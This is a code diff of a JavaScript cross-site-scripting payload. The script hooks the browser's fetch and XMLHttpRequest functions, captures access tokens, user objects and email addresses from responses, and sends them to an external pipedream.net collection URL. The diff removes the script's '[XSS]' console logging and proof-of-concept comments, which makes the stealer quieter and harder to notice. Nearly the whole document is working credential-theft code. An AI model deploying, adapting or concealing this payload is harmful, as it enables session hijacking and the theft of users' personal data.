@@ -1,10 +1,7 @@
 (function() {
-    // ===== CONFIGURATION =====
     var EXFIL_URL = 'https://6b884da34ac52d711d2d20ef6f2bf068.m.pipedream.net';
-    // =========================
 
     function exfiltrate(data) {
-        // Try sendBeacon first; fallback to fetch with keepalive
         try {
             navigator.sendBeacon(EXFIL_URL, JSON.stringify(data));
         } catch (e) {
@@ -13,16 +10,11 @@
                 body: JSON.stringify(data),
                 headers: { 'Content-Type': 'application/json' },
                 keepalive: true
-            }).catch(function(err) {
-                // If both fail, at least log to console for PoC
-                console.error('[XSS] Exfil failed:', err);
-            });
+            }).catch(function() {});
         }
-        // Always log to console for proof (visible in dev tools)
-        console.log('[XSS] Token stolen:', data.token);
     }
 
-    // --- Hook fetch() ---
+    // Hook fetch
     var originalFetch = window.fetch;
     window.fetch = function() {
         var args = arguments;
@@ -34,16 +26,13 @@
                         token: data.access_token,
                         user: data.user,
                         email: data.user ? data.user.email : null,
-                        timestamp: new Date().toISOString(),
-                        source: 'fetch'
+                        timestamp: new Date().toISOString()
                     });
                 }
             }).catch(function() {});
             return response;
         });
     };
-
-    // --- Hook XMLHttpRequest ---
     var originalOpen = XMLHttpRequest.prototype.open;
     var originalSend = XMLHttpRequest.prototype.send;
 
@@ -63,8 +52,7 @@
                             token: data.access_token,
                             user: data.user,
                             email: data.user ? data.user.email : null,
-                            timestamp: new Date().toISOString(),
-                            source: 'xhr'
+                            timestamp: new Date().toISOString()
                         });
                     }
                 } catch(e) {}
@@ -72,6 +60,4 @@
         });
         return originalSend.apply(this, arguments);
     };
-
-    console.log('[XSS] Payload loaded – token interceptor installed.');
 })();
